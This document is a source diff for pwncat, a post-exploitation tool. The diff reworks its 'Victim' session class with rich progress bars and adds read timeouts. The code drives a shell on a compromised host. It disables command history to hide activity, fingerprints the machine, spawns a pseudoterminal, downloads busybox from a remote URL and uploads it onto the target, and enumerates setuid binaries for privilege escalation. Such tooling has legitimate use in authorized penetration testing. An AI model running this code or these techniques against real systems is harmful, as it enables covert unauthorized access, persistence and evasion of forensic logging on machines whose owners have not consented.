@@ -9,6 +9,7 @@ import subprocess
 import sys
 import tempfile
 from typing import Dict, Optional, Any, List, Tuple, Iterator, Union, Generator
+import time
 
 import paramiko
 import pkg_resources
@@ -16,6 +17,13 @@ import requests
 from colorama import Fore
 from sqlalchemy.engine import Engine, create_engine
 from sqlalchemy.orm import Session, sessionmaker
+from rich.progress import (
+    Progress,
+    BarColumn,
+    DownloadColumn,
+    TransferSpeedColumn,
+    TimeRemainingColumn,
+)
 
 import pwncat.db
 import pwncat.enumerate
@@ -28,7 +36,7 @@ from pwncat.file import RemoteBinaryPipe
 from pwncat.gtfobins import GTFOBins, Capability, Stream
 from pwncat.remote import RemoteService
 from pwncat.tamper import TamperManager
-from pwncat.util import State
+from pwncat.util import State, console
 
 
 def remove_busybox_tamper():
@@ -103,8 +111,8 @@ class Victim:
         # Current user input state
         self._state = None
         # Saved remote terminal state (for transition to/from raw mode)
-        self.saved_term_state = util.enter_raw_mode()
-        util.restore_terminal(self.saved_term_state, new_line=False)
+        self.saved_term_state = None  # util.enter_raw_mode()
+        # util.restore_terminal(self.saved_term_state, new_line=False)
         # Prompt and prompt prefix
         self.remote_prefix = "\\[\\033[01;31m\\](remote)\\[\\033[00m\\]"
         self.remote_prompt = (
@@ -243,131 +251,161 @@ class Victim:
         # when in raw mode, since we do asynchronous IO in that case.
         # self.client.settimeout(1)
 
-        # Attempt to grab the remote hostname and mac address
-        hostname_path = self.run("which hostname").strip().decode("utf-8")
-        if hostname_path.startswith("/"):
-            hostname = self.run("hostname -f").strip()
-        else:
-            util.warn("hostname command not found; using peer address")
-            hostname = client.getpeername()[0].encode("utf-8")
-        mac = None
+        with Progress(
+            "initializing: [cyan]{task.fields[status]}[/cyan]",
+            BarColumn(bar_width=None),
+        ) as progress:
 
-        # Use ifconfig if available or ip link show.
-        ifconfig = self.run("which ifconfig").strip().decode("utf-8")
-        if ifconfig.startswith("/"):
-            ifconfig_a = self.run(f"{ifconfig} -a").strip().decode("utf-8").lower()
-            for line in ifconfig_a.split("\n"):
-                if "hwaddr" in line and "00:00:00:00:00:00" not in line:
-                    mac = line.split("hwaddr ")[1].split("\n")[0].strip()
-                    break
-        if mac is None:
-            ip = self.run("which ip").strip().decode("utf-8")
-            if ip.startswith("/"):
-                ip_link_show = self.run("ip link show").strip().decode("utf-8").lower()
-                for line in ip_link_show.split("\n"):
-                    if "link/ether" in line and "00:00:00:00:00:00" not in line:
-                        mac = line.split("link/ether ")[1].split(" ")[0]
-                        break
+            task_id = progress.add_task("initializing", total=7, status="hostname")
 
-        if mac is None:
-            util.warn("no mac address detected; host id only based on hostname!")
-
-        # Calculate the remote host's hash entry for lookup/storage in the database
-        # Ideally, this is a hash of the host and mac address. Worst case, it's a hash
-        # of "None", which isn't helpful. A middleground is possibly being able to
-        # get one or the other, which is also helpful and may happen if hostname isn't
-        # available or both ifconfig and "ip" aren't available.
-        host_hash = hashlib.md5(hostname + str(mac).encode("utf-8")).hexdigest()
-
-        # Lookup the remote host in our database. If it's not there, create an entry
-        self.host = self.session.query(pwncat.db.Host).filter_by(hash=host_hash).first()
-        if self.host is None:
-            util.info(
-                f"new host with hash {host_hash} (hostname: {hostname}, mac: {mac})"
-            )
-            # Create a new host entry
-            self.host = pwncat.db.Host(hash=host_hash)
-            # Probe for system information
-            self.probe_host_details()
-            # Add the host to the session
-            self.session.add(self.host)
-            # Commit what we know
-            self.session.commit()
-
-        # Save the remote host IP address
-        self.host.ip = self.client.getpeername()[0]
-
-        # We initialize this here, because it needs the database to initialize
-        # the history objects
-        self.command_parser.setup_prompt()
-
-        # Ensure history is disabled
-        util.info("disabling remote command history", overlay=True)
-        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
-
-        util.info("setting terminal prompt", overlay=True)
-        self.run("unset PROMPT_COMMAND")
-        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
-
-        self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
-        if self.shell.startswith("-"):
-            self.shell = self.shell[1:]
-        self.shell = self.which(self.shell.split(" ")[0])
-        util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")
-
-        # At this point, the system is functioning, but we don't have a raw terminal/
-        # pseudoterminal. Here, we attempt a couple methods of gaining a PTY.
-        if self.which("python") is not None:
-            method_cmd = Victim.OPEN_METHODS["python"].format(
-                self.which("python"), self.shell
-            )
-            method = "python"
-        elif self.which("script") is not None:
-            result = self.run("script --version")
-            if b"linux" in result:
-                method_cmd = f"exec script -qc {self.shell} /dev/null"
-                method = "script (util-linux)"
+            # Attempt to grab the remote hostname and mac address
+            hostname_path = self.run("which hostname").strip().decode("utf-8")
+            if hostname_path.startswith("/"):
+                hostname = self.run("hostname -f").strip()
             else:
-                method_cmd = f"exec script -q /dev/null {self.shell}"
-                method = "script (probably bsd)"
-            method = "script"
-        else:
-            util.error("no available methods to spawn a pty!")
-            raise RuntimeError("no available methods to spawn a pty!")
+                progress.log(
+                    "[yellow]warning[/yellow]: could not determine hostname; using peer address"
+                )
+                hostname = client.getpeername()[0].encode("utf-8")
+            mac = None
 
-        # Open the PTY
-        if not isinstance(self.client, paramiko.Channel):
-            util.info(
-                f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}",
-                overlay=True,
+            progress.update(task_id, status="mac address", advance=1)
+
+            # Use ifconfig if available or ip link show.
+            ifconfig = self.run("which ifconfig").strip().decode("utf-8")
+            if ifconfig.startswith("/"):
+                ifconfig_a = self.run(f"{ifconfig} -a").strip().decode("utf-8").lower()
+                for line in ifconfig_a.split("\n"):
+                    if "hwaddr" in line and "00:00:00:00:00:00" not in line:
+                        mac = line.split("hwaddr ")[1].split("\n")[0].strip()
+                        break
+            if mac is None:
+                ip = self.run("which ip").strip().decode("utf-8")
+                if ip.startswith("/"):
+                    ip_link_show = (
+                        self.run("ip link show").strip().decode("utf-8").lower()
+                    )
+                    for line in ip_link_show.split("\n"):
+                        if "link/ether" in line and "00:00:00:00:00:00" not in line:
+                            mac = line.split("link/ether ")[1].split(" ")[0]
+                            break
+
+            if mac is None:
+                progress.log(
+                    "[yellow]warning[/yellow]: no mac address; host hash only based on hostname"
+                )
+
+            # Calculate the remote host's hash entry for lookup/storage in the database
+            # Ideally, this is a hash of the host and mac address. Worst case, it's a hash
+            # of "None", which isn't helpful. A middleground is possibly being able to
+            # get one or the other, which is also helpful and may happen if hostname isn't
+            # available or both ifconfig and "ip" aren't available.
+            host_hash = hashlib.md5(hostname + str(mac).encode("utf-8")).hexdigest()
+
+            progress.update(task_id, status="database", advance=1)
+
+            # Lookup the remote host in our database. If it's not there, create an entry
+            self.host = (
+                self.session.query(pwncat.db.Host).filter_by(hash=host_hash).first()
             )
-            self.run(method_cmd, wait=False)
+            if self.host is None:
+                progress.log(f"new host w/ hash [cyan]{host_hash}[/cyan]")
+                # Create a new host entry
+                self.host = pwncat.db.Host(hash=host_hash)
+                # Probe for system information
+                self.probe_host_details(progress, task_id)
+                # Add the host to the session
+                self.session.add(self.host)
+                # Commit what we know
+                self.session.commit()
 
-        # This stuff won't carry through to the PTY, so we need to reset it again.
-        util.info("setting terminal prompt", overlay=True)
-        self.run("unset PROMPT_COMMAND")
-        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
+            # Save the remote host IP address
+            self.host.ip = self.client.getpeername()[0]
 
-        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
-        # opened)
-        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
+            # We initialize this here, because it needs the database to initialize
+            # the history objects
+            self.command_parser.setup_prompt()
 
-        # Disable automatic margins, which fuck up the prompt
-        self.run("tput rmam")
+            progress.update(task_id, status="history and prompt", advance=1)
 
-        # Now that we have a stable connection, we can create our
-        # privesc finder object.
-        self.privesc = privesc.Finder()
+            # Ensure history is disabled
+            self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
+            self.run("unset PROMPT_COMMAND")
+            self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
 
-        # Save our terminal state
-        self.stty_saved = self.run("stty -g").decode("utf-8").strip()
+            progress.update(task_id, status="running shell", advance=1)
 
-        # The session is fully setup now. This unlocks other
-        # commands in the command parser, which were blocked before.
-        self.command_parser.loaded = True
+            self.shell = (
+                self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
+            )
+            if self.shell.startswith("-"):
+                self.shell = self.shell[1:]
+            self.shell = self.which(self.shell.split(" ")[0])
 
-        # Synchronize the terminals
-        self.command_parser.dispatch_line("sync")
+            if self.shell is not None:
+                progress.log(f"pwncat running in [blue]{self.shell}[/blue]")
+            else:
+                progress.log(
+                    "[yellow]warning[/yellow]: could not detect shell; assuming [blue]/bin/sh[/blue]"
+                )
+                self.shell = self.which("sh")
+
+            progress.update(task_id, status="spawning pty", advance=1)
+
+            # At this point, the system is functioning, but we don't have a raw terminal/
+            # pseudoterminal. Here, we attempt a couple methods of gaining a PTY.
+            method = None
+            method_cmd = None
+
+            if self.which("python") is not None:
+                method_cmd = Victim.OPEN_METHODS["python"].format(
+                    self.which("python"), self.shell
+                )
+                method = "python"
+            elif self.which("script") is not None:
+                result = self.run("script --version")
+                if b"linux" in result:
+                    method_cmd = f"exec script -qc {self.shell} /dev/null"
+                    method = "script (util-linux)"
+                else:
+                    method_cmd = f"exec script -q /dev/null {self.shell}"
+                    method = "script (probably bsd)"
+                method = "script"
+            else:
+                progress.log("[red]error[/red]: no available pty methods!")
+
+            # Open the PTY
+            if not isinstance(self.client, paramiko.Channel) and method is not None:
+                self.run(method_cmd, wait=False)
+
+            progress.update(task_id, status="synchronizing prompt", advance=1)
+
+            # This stuff won't carry through to the PTY, so we need to reset it again.
+            self.run("unset PROMPT_COMMAND")
+            self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
+
+            # Make sure HISTFILE is unset in this PTY (it resets when a pty is
+            # opened)
+            self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
+
+            # Disable automatic margins, which fuck up the prompt
+            self.run("tput rmam")
+
+            # Now that we have a stable connection, we can create our
+            # privesc finder object.
+            self.privesc = privesc.Finder()
+
+            # Save our terminal state
+            self.stty_saved = self.run("stty -g").decode("utf-8").strip()
+
+            # The session is fully setup now. This unlocks other
+            # commands in the command parser, which were blocked before.
+            self.command_parser.loaded = True
+
+            # Synchronize the terminals
+            self.command_parser.dispatch_line("sync --quiet")
+
+            progress.update(task_id, status="complete", advance=1, visible=True)
 
         # Force the local TTY to enter raw mode
         self.state = State.RAW
@@ -386,7 +424,7 @@ class Victim:
         """
 
         if self.host.busybox is not None:
-            util.success("busybox is already available!")
+            console.log("busybox is already [green]available[/green]!")
             return
 
         busybox_remote_path = self.which("busybox")
@@ -397,37 +435,48 @@ class Victim:
             # probably be configurable.
             busybox_url = url.rstrip("/") + "/busybox-{arch}"
 
-            # Attempt to download the busybox binary
-            r = requests.get(busybox_url.format(arch=self.host.arch), stream=True)
+            with Progress(
+                "uploading busybox",
+                BarColumn(bar_width=None),
+                "[progress.percentage]{task.percentage:>3.1f}%",
+                "•",
+                DownloadColumn(),
+                "•",
+                TransferSpeedColumn(),
+                "•",
+                TimeRemainingColumn(),
+            ) as progress:
+                # Create the progress task
+                task_id = progress.add_task("download",)
 
-            # No busybox support
-            if r.status_code == 404:
-                util.warn(f"no busybox for architecture: {self.host.arch}")
-                return
+                # Attempt to download the busybox binary
+                r = requests.get(busybox_url.format(arch=self.host.arch), stream=True)
 
-            # Grab the original_content length if provided
-            length = r.headers.get("Content-Length", None)
-            if length is not None:
-                length = int(length)
+                # No busybox support
+                if r.status_code == 404:
+                    util.warn(f"no busybox for architecture: {self.host.arch}")
+                    return
 
-            # Stage a temporary file for busybox
-            busybox_remote_path = (
-                self.run("mktemp -t busyboxXXXXX").decode("utf-8").strip()
-            )
+                # Grab the original_content length if provided
+                length = r.headers.get("Content-Length", None)
+                if length is not None:
+                    length = int(length)
 
-            # Open the remote file for writing
-            with self.open(busybox_remote_path, "wb", length=length) as filp:
+                # Update the task total
+                progress.update(task_id, total=length)
 
-                # Local function for transferring the original_content
-                def transfer(on_progress):
+                # Stage a temporary file for busybox
+                busybox_remote_path = (
+                    self.run("mktemp -t busyboxXXXXX").decode("utf-8").strip()
+                )
+
+                # Open the remote file for writing
+                with self.open(busybox_remote_path, "wb", length=length) as filp:
+                    progress.start_task(task_id)
+
                     for chunk in r.iter_content(chunk_size=1024 * 1024):
                         filp.write(chunk)
-                        on_progress(len(chunk))
-
-                # Run the transfer with a progress bar
-                util.with_progress(
-                    f"uploading busybox for {self.host.arch}", transfer, length,
-                )
+                        progress.update(task_id, advance=len(chunk))
 
             # Make busybox executable
             self.run(f"chmod +x {shlex.quote(busybox_remote_path)}")
@@ -441,51 +490,43 @@ class Victim:
                 remove_busybox_tamper,
             )
 
-            util.success(
-                f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
+            console.log(
+                f"[green]uploaded[/green] busybox to [cyan]{busybox_remote_path}[/cyan]"
             )
 
             self.host.busybox_uploaded = True
 
         else:
             # Busybox was provided on the system!
-            util.success(f"busybox already installed on remote system!")
+            console.log(f"busybox [green]already installed[/green] on remote system!")
             self.host.busybox_uploaded = False
 
-        # Check what this busybox provides
-        util.progress("enumerating provided applets")
-        pipe = self.subprocess(f"{shlex.quote(busybox_remote_path)} --list")
-        provides = pipe.read().decode("utf-8").strip().split("\n")
-        pipe.close()
+        # Grabbing the number of expected applets provides better
+        # progress output.
+        count = int(
+            self.run(f"{shlex.quote(busybox_remote_path)} --list | wc -l")
+            .decode("utf-8")
+            .strip()
+        )
+        provides = []
 
-        # prune any entries which the system marks as SETUID or SETGID
-        stat = self.which("stat", quote=True)
-
-        if stat is not None:
-            util.progress("enumerating remote binary permissions")
-            which_provides = [f"`which {p}`" for p in provides]
-            new_provides = []
-
-            with self.subprocess(
-                f"{stat} -c %A {' '.join(which_provides)}", "r"
-            ) as pipe:
-                for name, perms in zip(provides, pipe):
-                    perms = perms.decode("utf-8").strip().lower()
-                    if "no such" in perms:
-                        # The remote system doesn't have this binary
-                        continue
-                    if "s" not in perms:
-                        util.progress(
-                            f"keeping {Fore.BLUE}{name}{Fore.RESET} in busybox"
-                        )
-                        new_provides.append(name)
-                    else:
-                        util.progress(
-                            f"pruning {Fore.RED}{name}{Fore.RESET} from busybox"
-                        )
-
-            util.success(f"pruned {len(provides) - len(new_provides)} setuid entries")
-            provides = new_provides
+        # display a progress bar while enumerating applets
+        with Progress(
+            "enumerating applets: [cyan]{task.fields[applet]}[/cyan]",
+            BarColumn(bar_width=None),
+        ) as progress:
+            task_id = progress.add_task("enumerating", applet="", total=count)
+            for line in self.subprocess(
+                f'{shlex.quote(busybox_remote_path)} --list | while read name; do echo "$(stat -c %A $(which $name) 2>/dev/null || echo -n none) $name"; done'
+            ):
+                # Parse out the name and permissions
+                line = line.decode("utf-8").strip()
+                perms, *name = line.split(" ")
+                name = " ".join(name)
+                # Either it wasn't SUID, or it was "none".
+                if "s" not in perms:
+                    provides.append(name)
+                progress.update(task_id, applet=name, advance=1)
 
         # Let the class know we now have access to busybox
         self.host.busybox = busybox_remote_path
@@ -504,14 +545,16 @@ class Victim:
 
         self.session.commit()
 
-    def probe_host_details(self):
+        console.log(f"busybox installed w/ {len(provides)} applets")
+
+    def probe_host_details(self, progress: Progress, task_id):
         """
         Probe the remote host for details such as the installed init system, distribution
         architecture, etc. This information is stored in the database and only retrieved
         for new systems or if the database was removed.
         """
 
-        util.progress("identifying init system")
+        # progress.update(task_id, status="init system")
         try:
             with self.open("/proc/1/comm", "r") as filp:
                 init = filp.read()
@@ -527,19 +570,19 @@ class Victim:
         else:
             self.host.init = util.Init.UNKNOWN
 
-        util.progress("identifying remote kernel version")
+        # progress.update(task_id, status="kernel version")
         try:
             self.host.kernel = self.env(["uname", "-r"]).strip().decode("utf-8")
         except FileNotFoundError:
             self.host.kernel = "unknown"
 
-        util.progress("identifying remote architecture")
+        # progress.update(task_id, status="architecture")
         try:
             self.host.arch = self.env(["uname", "-m"]).strip().decode("utf-8")
         except FileNotFoundError:
             self.host.arch = "unknown"
 
-        util.progress("identifying remote distribution")
+        # progress.update(task_id, status="distribution", visible=False)
         try:
             with self.open("/etc/os-release", "r") as filp:
                 for line in filp:
@@ -693,7 +736,7 @@ class Victim:
         if value == State.RAW:
             self.flush_output()
             self.client.send(b"\n")
-            util.success("pwncat is ready 🐈")
+            console.log("pwncat is ready 🐈")
             self.saved_term_state = util.enter_raw_mode()
             self.command_parser.running = False
             self._state = value
@@ -702,8 +745,20 @@ class Victim:
             # Go back to normal mode
             self.restore_local_term()
             self._state = State.COMMAND
+
+            # Use a simple "echo" command to ensure we are actually at a shell
+            try:
+                self.run("echo", timeout=2)
+            except TimeoutError:
+                console.log(
+                    "[yellow]warning[/yellow]: you don't appear to be at a shell; returning to raw mode."
+                )
+                self.saved_term_state = util.enter_raw_mode()
+                self._state = State.RAW
+                return
+
             # Hopefully this fixes weird cursor position issues
-            util.success("local terminal restored")
+            console.log("local terminal restored")
             # Reload the current user name
             self.update_user()
             # Setting the state to local command mode does not return until
@@ -899,6 +954,8 @@ class Victim:
         envp: Dict[str, Any] = None,
         wait: bool = True,
         input: bytes = b"",
+        stderr: str = None,
+        stdout: str = None,
         **kwargs,
     ) -> bytes:
         """
@@ -945,10 +1002,15 @@ class Victim:
         # Join in the command string
         command = f"{command} " + util.join(argv)
 
+        if stderr is not None:
+            command += f" 2>{stderr}"
+        if stdout is not None:
+            command += f" >{stdout}"
+
         # Run the command
         return self.run(command, wait=wait, input=input)
 
-    def run(self, cmd, wait: bool = True, input: bytes = b"") -> bytes:
+    def run(self, cmd, wait: bool = True, input: bytes = b"", timeout=None) -> bytes:
         """
         Run a command on the remote host and return the output. This function
         is similar to `env` but takes a string as the input instead of a list
@@ -962,11 +1024,16 @@ class Victim:
         :type cmd: str
         """
 
-        sdelim, edelim = self.process(cmd, delim=wait)
+        sdelim, edelim = self.process(cmd, delim=wait, timeout=timeout)
+
+        if callable(input):
+            input()
+        elif input:
+            self.client.send(input)
 
         if wait:
 
-            response = self.recvuntil(edelim.encode("utf-8"))
+            response = self.recvuntil(edelim.encode("utf-8"), timeout=timeout)
 
             response = response.split(edelim.encode("utf-8"))[0]
             if sdelim.encode("utf-8") in response:
@@ -976,14 +1043,9 @@ class Victim:
         else:
             response = edelim.encode("utf-8")
 
-        if callable(input):
-            input()
-        elif input:
-            self.client.send(input)
-
         return response
 
-    def process(self, cmd, delim=True) -> Tuple[str, str]:
+    def process(self, cmd, delim=True, timeout=None) -> Tuple[str, str]:
         """
         Start a process on the remote host. This is the underlying logic
         for ``run`` and ``env``. If ``delim`` is true (default), then
@@ -1012,7 +1074,7 @@ class Victim:
         if delim:
             # Receive until we get our starting delimeter on a line by itself
             while True:
-                x = self.recvuntil(b"\n")
+                x = self.recvuntil(b"\n", timeout=timeout)
                 if x.startswith(sdelim.encode("utf-8")):
                     break
 
@@ -1477,7 +1539,7 @@ class Victim:
             raise ValueError("expected write mode for temporary files")
 
         try:
-            path = self.env(["mktemp", f"--suffix={suffix}"])
+            path = self.env(["mktemp", f"--suffix={suffix}"], stderr="/dev/null")
             path = path.strip().decode("utf-8")
         except FileNotFoundError:
             path = "/tmp/tmp" + util.random_string(8) + suffix
@@ -1807,7 +1869,7 @@ class Victim:
         self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
         self.run(f"tput rmam")
 
-    def recvuntil(self, needle: bytes, interp=False):
+    def recvuntil(self, needle: bytes, interp=False, timeout=None):
         """
         Receive data from the socket until the specified string of bytes is
         found. There is no timeout features, so you should be 100% sure these
@@ -1823,20 +1885,37 @@ class Victim:
         if isinstance(needle, str):
             needle = needle.encode("utf-8")
 
-        result = b""
-        while not result.endswith(needle):
-            try:
-                data = self.client.recv(1)
-                # Bash sends some **WEIRD** shit and wraps it in backspace
-                # characters for some reason. When asked, we interpret the
-                # backspace characters so the response is what we expect.
-                if interp and data == b"\x08":
-                    if len(result) > 0:
-                        result = result[:-1]
-                else:
-                    result += data
-            except (socket.timeout, BlockingIOError):
-                continue  # force waiting
+        # Set the timeout
+        old_timeout = self.client.gettimeout()
+        ending_time = None
+        if timeout is not None:
+            ending_time = time.time() + timeout
+
+        try:
+            result = b""
+            while not result.endswith(needle):
+                if timeout is not None and time.time() > ending_time:
+                    break
+                try:
+                    if timeout is not None:
+                        self.client.settimeout(ending_time - time.time())
+                    data = self.client.recv(1)
+                    # Bash sends some **WEIRD** shit and wraps it in backspace
+                    # characters for some reason. When asked, we interpret the
+                    # backspace characters so the response is what we expect.
+                    if interp and data == b"\x08":
+                        if len(result) > 0:
+                            result = result[:-1]
+                    else:
+                        result += data
+                except (socket.timeout, BlockingIOError):
+                    continue  # force waiting
+        finally:
+            self.client.settimeout(old_timeout)
+
+        # Raise an exception with what we did read
+        if not result.endswith(needle):
+            raise TimeoutError(result)
 
         return result
 
